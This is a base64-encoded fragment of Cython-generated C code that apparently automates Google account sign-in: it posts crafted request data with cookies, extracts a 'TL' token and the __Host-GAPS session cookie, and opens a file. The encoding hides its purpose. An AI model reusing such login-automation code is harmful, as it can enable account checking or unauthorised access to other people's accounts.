3RfU2V0SXRlbShfX3B5eF90XzcsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfdXNlcl9hZ2VudCwgX19weXhfdF84KSA8ICgwKSkgX19QWVhfRVJSKDAsIDEwNSwgX19weXhfTDNfZXJyb3IpCiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzgpOyBfX3B5eF90XzggPSAwOwogICAgICBfX3B5eF92X2hlYWRlcnMgPSAoKFB5T2JqZWN0KilfX3B5eF90XzcpOwogICAgICBfX3B5eF90XzcgPSAwOwoKICAgICAgCiAgICAgIF9fcHl4X3RfNyA9IF9fUHl4X1B5RGljdF9OZXdQcmVzaXplZCgyKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzcpKSBfX1BZWF9FUlIoMCwgMTA3LCBfX3B5eF9MM19lcnJvcikKICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNyk7CiAgICAgIF9fcHl4X3RfOCA9IF9fUHl4X1B5T2JqZWN0X0Zvcm1hdFNpbXBsZShfX3B5eF92X3RvaywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZW1wdHlfdW5pY29kZSk7IGlmICh1bmxpa2VseSghX19weXhfdF84KSkgX19QWVhfRVJSKDAsIDEwNywgX19weXhfTDNfZXJyb3IpCiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzgpOwogICAgICBfX3B5eF90XzUgPSBfX1B5eF9QeVVuaWNvZGVfVW5pY29kZShfX3B5eF92X24xKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzUpKSBfX1BZWF9FUlIoMCwgMTA3LCBfX3B5eF9MM19lcnJvcikKICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNSk7CiAgICAgIF9fcHl4X3RfNiA9IF9fUHl4X1B5VW5pY29kZV9Vbmljb2RlKF9fcHl4X3ZfbjIpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNikpIF9fUFlYX0VSUigwLCAxMDcsIF9fcHl4X0wzX2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF82KTsKICAgICAgX19weXhfdF80ID0gX19QeXhfUHlVbmljb2RlX1VuaWNvZGUoX19weXhfdl9uMSk7IGlmICh1bmxpa2VseSghX19weXhfdF80KSkgX19QWVhfRVJSKDAsIDEwNywgX19weXhfTDNfZXJyb3IpCiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzQpOwogICAgICBfX3B5eF90XzExID0gX19QeXhfUHlVbmljb2RlX1VuaWNvZGUoX19weXhfdl9uMik7IGlmICh1bmxpa2VseSghX19weXhfdF8xMSkpIF9fUFlYX0VSUigwLCAxMDcsIF9fcHl4X0wzX2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xMSk7CiAgICAgIF9fcHl4X3RfMTJbMF0gPSBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X18zOwogICAgICBfX3B5eF90XzEyWzFdID0gX19weXhfdF84OwogICAgICBfX3B5eF90XzEyWzJdID0gX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9fNDsKICAgICAgX19weXhfdF8xMlszXSA9IF9fcHl4X3RfNTsKICAgICAgX19weXhfdF8xMls0XSA9IF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfXzQ7CiAgICAgIF9fcHl4X3RfMTJbNV0gPSBfX3B5eF90XzY7CiAgICAgIF9fcHl4X3RfMTJbNl0gPSBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X180OwogICAgICBfX3B5eF90XzEyWzddID0gX19weXhfdF80OwogICAgICBfX3B5eF90XzEyWzhdID0gX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9fNDsKICAgICAgX19weXhfdF8xMls5XSA9IF9fcHl4X3RfMTE7CiAgICAgIF9fcHl4X3RfMTJbMTBdID0gX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV8wXzBfbnVsbF9udWxsX3dlYl9nbGlmX3NpZ251cF8wOwogICAgICBfX3B5eF90XzEzID0gX19QeXhfUHlVbmljb2RlX0pvaW4oX19weXhfdF8xMiwgMTEsIDIgKyBfX1B5eF9QeVVuaWNvZGVfR0VUX0xFTkdUSChfX3B5eF90XzgpICsgMyAqIDQgKyBfX1B5eF9QeVVuaWNvZGVfR0VUX0xFTkdUSChfX3B5eF90XzUpICsgX19QeXhfUHlVbmljb2RlX0dFVF9MRU5HVEgoX19weXhfdF82KSArIF9fUHl4X1B5VW5pY29kZV9HRVRfTEVOR1RIKF9fcHl4X3RfNCkgKyBfX1B5eF9QeVVuaWNvZGVfR0VUX0xFTkdUSChfX3B5eF90XzExKSArIDQ4LCAxMjcgfCBfX1B5eF9QeVVuaWNvZGVfTUFYX0NIQVJfVkFMVUUoX19weXhfdF84KSB8IF9fUHl4X1B5VW5pY29kZV9NQVhfQ0hBUl9WQUxVRShfX3B5eF90XzUpIHwgX19QeXhfUHlVbmljb2RlX01BWF9DSEFSX1ZBTFVFKF9fcHl4X3RfNikgfCBfX1B5eF9QeVVuaWNvZGVfTUFYX0NIQVJfVkFMVUUoX19weXhfdF80KSB8IF9fUHl4X1B5VW5pY29kZV9NQVhfQ0hBUl9WQUxVRShfX3B5eF90XzExKSk7CiAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF8xMykpIF9fUFlYX0VSUigwLCAxMDcsIF9fcHl4X0wzX2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xMyk7CiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzgpOyBfX3B5eF90XzggPSAwOwogICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDsKICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNik7IF9fcHl4X3RfNiA9IDA7CiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwOwogICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xMSk7IF9fcHl4X3RfMTEgPSAwOwogICAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF83LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X2ZfcmVxLCBfX3B5eF90XzEzKSA8ICgwKSkgX19QWVhfRVJSKDAsIDEwNywgX19weXhfTDNfZXJyb3IpCiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEzKTsgX19weXhfdF8xMyA9IDA7CiAgICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzcsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9kZXZpY2VpbmZvLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X251bGxfbnVsbF9udWxsX251bGxfbnVsbF9OTF9udWwpIDwgKDApKSBfX1BZWF9FUlIoMCwgMTA3LCBfX3B5eF9MM19lcnJvcikKICAgICAgX19weXhfdl9kYXRhID0gKChQeU9iamVjdCopX19weXhfdF83KTsKICAgICAgX19weXhfdF83ID0gMDsKCiAgICAgIAogICAgICBfX3B5eF90XzEzID0gTlVMTDsKICAgICAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzExLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfcmVxdWVzdHMpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTEpKSBfX1BZWF9FUlIoMCwgMTA5LCBfX3B5eF9MM19lcnJvcikKICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTEpOwogICAgICBfX3B5eF90XzQgPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKF9fcHl4X3RfMTEsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9wb3N0KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgMTA5LCBfX3B5eF9MM19lcnJvcikKICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7CiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzExKTsgX19weXhfdF8xMSA9IDA7CgogICAgICAKICAgICAgX19weXhfdF85ID0gMTsKICAgICAgI2lmIENZVEhPTl9VTlBBQ0tfTUVUSE9EUwogICAgICBpZiAodW5saWtlbHkoUHlNZXRob2RfQ2hlY2soX19weXhfdF80KSkpIHsKICAgICAgICBfX3B5eF90XzEzID0gUHlNZXRob2RfR0VUX1NFTEYoX19weXhfdF80KTsKICAgICAgICBhc3NlcnQoX19weXhfdF8xMyk7CiAgICAgICAgUHlPYmplY3QqIF9fcHl4X19mdW5jdGlvbiA9IFB5TWV0aG9kX0dFVF9GVU5DVElPTihfX3B5eF90XzQpOwogICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF90XzEzKTsKICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfX2Z1bmN0aW9uKTsKICAgICAgICBfX1B5eF9ERUNSRUZfU0VUKF9fcHl4X3RfNCwgX19weXhfX2Z1bmN0aW9uKTsKICAgICAgICBfX3B5eF90XzkgPSAwOwogICAgICB9CiAgICAgICNlbmRpZgogICAgICB7CiAgICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzIgKyAoKENZVEhPTl9WRUNUT1JDQUxMKSA/IDMgOiAwKV0gPSB7X19weXhfdF8xMywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9odHRwc19hY2NvdW50c19nb29nbGVfY29tX19fc2lnbn07CiAgICAgICAgX19weXhfdF8xMSA9IF9fUHl4X01ha2VWZWN0b3JjYWxsQnVpbGRlckt3ZHMoMyk7IGlmICh1bmxpa2VseSghX19weXhfdF8xMSkpIF9fUFlYX0VSUigwLCAxMDksIF9fcHl4X0wzX2Vycm9yKQogICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzExKTsKICAgICAgICBpZiAoX19QeXhfVmVjdG9yY2FsbEJ1aWxkZXJfQWRkQXJnKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9jb29raWVzLCBfX3B5eF92X2Nvb2tpZXMsIF9fcHl4X3RfMTEsIF9fcHl4X2NhbGxhcmdzKzIsIDApIDwgKDApKSBfX1BZWF9FUlIoMCwgMTA5LCBfX3B5eF9MM19lcnJvcikKICAgICAgICBpZiAoX19QeXhfVmVjdG9yY2FsbEJ1aWxkZXJfQWRkQXJnKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9oZWFkZXJzLCBfX3B5eF92X2hlYWRlcnMsIF9fcHl4X3RfMTEsIF9fcHl4X2NhbGxhcmdzKzIsIDEpIDwgKDApKSBfX1BZWF9FUlIoMCwgMTA5LCBfX3B5eF9MM19lcnJvcikKICAgICAgICBpZiAoX19QeXhfVmVjdG9yY2FsbEJ1aWxkZXJfQWRkQXJnKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9kYXRhLCBfX3B5eF92X2RhdGEsIF9fcHl4X3RfMTEsIF9fcHl4X2NhbGxhcmdzKzIsIDIpIDwgKDApKSBfX1BZWF9FUlIoMCwgMTA5LCBfX3B5eF9MM19lcnJvcikKICAgICAgICBfX3B5eF90XzcgPSBfX1B5eF9PYmplY3RfVmVjdG9yY2FsbF9DYWxsRnJvbUJ1aWxkZXIoX19weXhfdF80LCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzksICgyLV9fcHl4X3RfOSkgfCAoX19weXhfdF85Kl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCksIF9fcHl4X3RfMTEpOwogICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMyk7IF9fcHl4X3RfMTMgPSAwOwogICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzExKTsgX19weXhfdF8xMSA9IDA7CiAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7CiAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzcpKSBfX1BZWF9FUlIoMCwgMTA5LCBfX3B5eF9MM19lcnJvcikKICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF83KTsKICAgICAgfQogICAgICBfX3B5eF92X3Jlc3BvbnNlID0gX19weXhfdF83OwogICAgICBfX3B5eF90XzcgPSAwOwoKICAgICAgCiAgICAgIF9fcHl4X3RfNyA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHIoX19weXhfdl9yZXNwb25zZSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3N0YXR1c19jb2RlKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzcpKSBfX1BZWF9FUlIoMCwgMTExLCBfX3B5eF9MM19lcnJvcikKICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNyk7CiAgICAgIF9fcHl4X3RfMTAgPSAoX19QeXhfUHlMb25nX0Jvb2xOZU9iakMoX19weXhfdF83LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9pbnRfMjAwLCAweEM4LCAwKSk7IGlmICh1bmxpa2VseSgoX19weXhfdF8xMCA8IDApKSkgX19QWVhfRVJSKDAsIDExMSwgX19weXhfTDNfZXJyb3IpCiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzcpOyBfX3B5eF90XzcgPSAwOwogICAgICBpZiAodW5saWtlbHkoX19weXhfdF8xMCkpIHsKCiAgICAgICAgCiAgICAgICAgX19weXhfdF80ID0gTlVMTDsKICAgICAgICBfX1B5eF9JTkNSRUYoKFB5T2JqZWN0ICopKCgoUHlUeXBlT2JqZWN0KilQeUV4Y19FeGNlcHRpb24pKSk7CiAgICAgICAgX19weXhfdF8xMSA9ICgoUHlPYmplY3QgKikoKChQeVR5cGVPYmplY3QqKVB5RXhjX0V4Y2VwdGlvbikpKTsgCiAgICAgICAgX19weXhfdF85ID0gMTsKICAgICAgICB7CiAgICAgICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF80LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X1ZhbGlkYXRpb25fZmFpbGVkfTsKICAgICAgICAgIF9fcHl4X3RfNyA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsKF9fcHl4X3RfMTEsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfOSwgKDItX19weXhfdF85KSB8IChfX3B5eF90XzkqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7CiAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7CiAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xMSk7IF9fcHl4X3RfMTEgPSAwOwogICAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzcpKSBfX1BZWF9FUlIoMCwgMTEyLCBfX3B5eF9MM19lcnJvcikKICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzcpOwogICAgICAgIH0KICAgICAgICBfX1B5eF9SYWlzZShfX3B5eF90XzcsIDAsIDAsIDApOwogICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzcpOyBfX3B5eF90XzcgPSAwOwogICAgICAgIF9fUFlYX0VSUigwLCAxMTIsIF9fcHl4X0wzX2Vycm9yKQoKICAgICAgICAKICAgICAgfQoKICAgICAgCiAgICAgIF9fcHl4X3RfMTEgPSBOVUxMOwogICAgICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfNCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3JlKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgMTEzLCBfX3B5eF9MM19lcnJvcikKICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7CiAgICAgIF9fcHl4X3RfMTMgPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKF9fcHl4X3RfNCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3NlYXJjaCk7IGlmICh1bmxpa2VseSghX19weXhfdF8xMykpIF9fUFlYX0VSUigwLCAxMTMsIF9fcHl4X0wzX2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xMyk7CiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwOwogICAgICBfX3B5eF90XzQgPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKF9fcHl4X3ZfcmVzcG9uc2UsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV90ZXh0KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgMTEzLCBfX3B5eF9MM19lcnJvcikKICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7CiAgICAgIF9fcHl4X3RfOSA9IDE7CiAgICAgICNpZiBDWVRIT05fVU5QQUNLX01FVEhPRFMKICAgICAgaWYgKHVubGlrZWx5KFB5TWV0aG9kX0NoZWNrKF9fcHl4X3RfMTMpKSkgewogICAgICAgIF9fcHl4X3RfMTEgPSBQeU1ldGhvZF9HRVRfU0VMRihfX3B5eF90XzEzKTsKICAgICAgICBhc3NlcnQoX19weXhfdF8xMSk7CiAgICAgICAgUHlPYmplY3QqIF9fcHl4X19mdW5jdGlvbiA9IFB5TWV0aG9kX0dFVF9GVU5DVElPTihfX3B5eF90XzEzKTsKICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfdF8xMSk7CiAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X19mdW5jdGlvbik7CiAgICAgICAgX19QeXhfREVDUkVGX1NFVChfX3B5eF90XzEzLCBfX3B5eF9fZnVuY3Rpb24pOwogICAgICAgIF9fcHl4X3RfOSA9IDA7CiAgICAgIH0KICAgICAgI2VuZGlmCiAgICAgIHsKICAgICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbM10gPSB7X19weXhfdF8xMSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9udWxsLCBfX3B5eF90XzR9OwogICAgICAgIF9fcHl4X3RfNyA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsKF9fcHl4X3RfMTMsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfOSwgKDMtX19weXhfdF85KSB8IChfX3B5eF90XzkqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7CiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzExKTsgX19weXhfdF8xMSA9IDA7CiAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7CiAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTMpOyBfX3B5eF90XzEzID0gMDsKICAgICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfNykpIF9fUFlYX0VSUigwLCAxMTMsIF9fcHl4X0wzX2Vycm9yKQogICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzcpOwogICAgICB9CiAgICAgIF9fcHl4X3ZfdGxfbWF0Y2ggPSBfX3B5eF90Xzc7CiAgICAgIF9fcHl4X3RfNyA9IDA7CgogICAgICAKICAgICAgX19weXhfdF8xMCA9IF9fUHl4X1B5T2JqZWN0X0lzVHJ1ZShfX3B5eF92X3RsX21hdGNoKTsgaWYgKHVubGlrZWx5KChfX3B5eF90XzEwIDwgMCkpKSBfX1BZWF9FUlIoMCwgMTE0LCBfX3B5eF9MM19lcnJvcikKICAgICAgaWYgKGxpa2VseShfX3B5eF90XzEwKSkgewoKICAgICAgICAKICAgICAgICBfX3B5eF90XzEzID0gX19weXhfdl90bF9tYXRjaDsKICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfdF8xMyk7CiAgICAgICAgX19weXhfdF85ID0gMDsKICAgICAgICB7CiAgICAgICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF8xMywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzF9OwogICAgICAgICAgX19weXhfdF83ID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGxNZXRob2QoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2dyb3VwLCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzksICgyLV9fcHl4X3RfOSkgfCAoMSpfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTsKICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMyk7IF9fcHl4X3RfMTMgPSAwOwogICAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzcpKSBfX1BZWF9FUlIoMCwgMTE1LCBfX3B5eF9MM19lcnJvcikKICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzcpOwogICAgICAgIH0KICAgICAgICBfX3B5eF92X3RsID0gX19weXhfdF83OwogICAgICAgIF9fcHl4X3RfNyA9IDA7CgogICAgICAgIAogICAgICAgIGdvdG8gX19weXhfTDExOwogICAgICB9CgogICAgICAKICAgICAgIHsKICAgICAgICBfX3B5eF90XzEzID0gTlVMTDsKICAgICAgICBfX1B5eF9JTkNSRUYoKFB5T2JqZWN0ICopKCgoUHlUeXBlT2JqZWN0KilQeUV4Y19FeGNlcHRpb24pKSk7CiAgICAgICAgX19weXhfdF80ID0gKChQeU9iamVjdCAqKSgoKFB5VHlwZU9iamVjdCopUHlFeGNfRXhjZXB0aW9uKSkpOyAKICAgICAgICBfX3B5eF90XzkgPSAxOwogICAgICAgIHsKICAgICAgICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzEzLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X1RMX25vdF9mb3VuZH07CiAgICAgICAgICBfX3B5eF90XzcgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbChfX3B5eF90XzQsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfOSwgKDItX19weXhfdF85KSB8IChfX3B5eF90XzkqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7CiAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTMpOyBfX3B5eF90XzEzID0gMDsKICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwOwogICAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzcpKSBfX1BZWF9FUlIoMCwgMTE3LCBfX3B5eF9MM19lcnJvcikKICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzcpOwogICAgICAgIH0KICAgICAgICBfX1B5eF9SYWlzZShfX3B5eF90XzcsIDAsIDAsIDApOwogICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzcpOyBfX3B5eF90XzcgPSAwOwogICAgICAgIF9fUFlYX0VSUigwLCAxMTcsIF9fcHl4X0wzX2Vycm9yKQogICAgICB9CiAgICAgIF9fcHl4X0wxMTo7CgogICAgICAKICAgICAgX19weXhfdF82ID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cihfX3B5eF92X3Jlc3BvbnNlLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfY29va2llcyk7IGlmICh1bmxpa2VseSghX19weXhfdF82KSkgX19QWVhfRVJSKDAsIDExOCwgX19weXhfTDNfZXJyb3IpCiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzYpOwogICAgICBfX3B5eF90XzExID0gX19weXhfdF82OwogICAgICBfX1B5eF9JTkNSRUYoX19weXhfdF8xMSk7CiAgICAgIF9fcHl4X3RfOSA9IDA7CiAgICAgIHsKICAgICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF8xMSwgTlVMTH07CiAgICAgICAgX19weXhfdF8xMyA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsTWV0aG9kKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9nZXRfZGljdCwgX19weXhfY2FsbGFyZ3MrX19weXhfdF85LCAoMS1fX3B5eF90XzkpIHwgKDEqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7CiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzExKTsgX19weXhfdF8xMSA9IDA7CiAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNik7IF9fcHl4X3RfNiA9IDA7CiAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEzKSkgX19QWVhfRVJSKDAsIDExOCwgX19weXhfTDNfZXJyb3IpCiAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTMpOwogICAgICB9CiAgICAgIF9fcHl4X3RfNCA9IF9fcHl4X3RfMTM7CiAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF90XzQpOwogICAgICBfX3B5eF90XzkgPSAwOwogICAgICB7CiAgICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzNdID0ge19fcHl4X3RfNCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9Ib3N0X0dBUFMsIF9fcHl4X3ZfaG9zdH07CiAgICAgICAgX19weXhfdF83ID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGxNZXRob2QoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2dldCwgX19weXhfY2FsbGFyZ3MrX19weXhfdF85LCAoMy1fX3B5eF90XzkpIHwgKDEqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7CiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwOwogICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEzKTsgX19weXhfdF8xMyA9IDA7CiAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzcpKSBfX1BZWF9FUlIoMCwgMTE4LCBfX3B5eF9MM19lcnJvcikKICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF83KTsKICAgICAgfQogICAgICBfX1B5eF9ERUNSRUZfU0VUKF9fcHl4X3ZfaG9zdCwgX19weXhfdF83KTsKICAgICAgX19weXhfdF83ID0gMDsKCiAgICAgIAogICAgICAgewogICAgICAgIF9fcHl4X3RfNyA9IF9fUHl4X1B5T2JqZWN0X0NhbGwoX19weXhfYnVpbHRpbl9vcGVuLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVs0XSwgTlVMTCk7IGlmICh1bmxpa2VseSghX19weXhfdF83KSkgX19QWVhfRVJSKDAsIDExOSwgX19weXhfTDNfZXJyb3IpCiAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNyk7CiAgICAgICAgX19weXhfdF8xNCA9IF9fUHl4X1B5T2JqZWN0X0xvb2t1cFNwZWNpYWwoX19weXhfdF83LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZXhpdCk7IGlmICh1bmxpa2VseSghX19weXhfdF8xNCkpIF9fUFlYX0VSUigwLCAxMTksIF9fcHl4X0wzX2Vycm9yKQogICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzE0KTsKICAgICAgICBfX3B5eF90XzQgPSBOVUxMOwogICAgICAgIF9fcHl4X3RfNiA9IF9fUHl4X1B5T2JqZWN0X0xvb2t1cFNwZWNpYWwoX19weXhfdF83LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZW50ZXIpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNikpIF9fUFlYX0VSUigwLCAxMTksIF9fcHl4X0wxMl9lcnJvcikKICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF82KTsKICAgICAgICBfX3B5eF90XzkgPSAxOwogICAgICAgICNpZiBDWVRIT05fVU5QQUNLX01FVEhPRFMKICAgICAgICBpZiAobGlrZWx5KFB5TWV0aG9kX0NoZWNrKF9fcHl4X3RfNikpKSB7CiAgICAgICAgICBfX3B5eF90XzQgPSBQeU1ldGhvZF9HRVRfU0VMRihfX3B5eF90XzYpOwogICAgICAgICAgYXNzZXJ0KF9fcHl4X3RfNCk7CiAgICAgICAgICBQeU9iamVjdCogX19weXhfX2Z1bmN0aW9uID0gUHlNZXRob2RfR0VUX0ZVTkNUSU9OKF9fcHl4X3RfNik7CiAgICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfdF80KTsKICAgICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF9fZnVuY3Rpb24pOwogICAgICAgICAgX19QeXhfREVDUkVGX1NFVChfX3B5eF90XzYsIF9fcHl4X19mdW5jdGlvbik7CiAgICAgICAgICBfX3B5eF90XzkgPSAwOwogICAgICAgIH0KICAgICAgICAjZW5kaWYKICAgICAgICB7CiAgICAgICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF80LCBOVUxMfTsKICAgICAgICAgIF9fcHl4X3RfMTMg